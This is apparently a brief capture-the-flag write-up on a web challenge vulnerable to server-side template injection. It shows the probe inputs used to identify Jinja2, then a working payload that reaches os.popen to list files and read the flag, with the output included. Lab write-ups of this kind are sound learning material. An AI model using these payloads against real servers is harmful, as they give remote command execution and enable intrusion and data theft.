Based on the way STI was capitalized in the title i decided to search up 'STI web exploit' and found out about:

> [Server Side Template Injection ](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)

To find out the template engine used in the website I attempted the following inputs
```
{{7*7}}  ->  49
{{7*'7'}  ->  7777777
```
This got me `Jinja2` as the engine
After this it was as simple as passing the following
```
{{ namespace.__init__.__globals__.os.popen('ls').read() }}	->	app.py flag.txt requirements.txt templates 
{{ namespace.__init__.__globals__.os.popen('cat flag.txt').read() }}	->	aetherius{Template-Injection-101-240745ae-fce5-42ac-b854-aa5a11963a72}
```
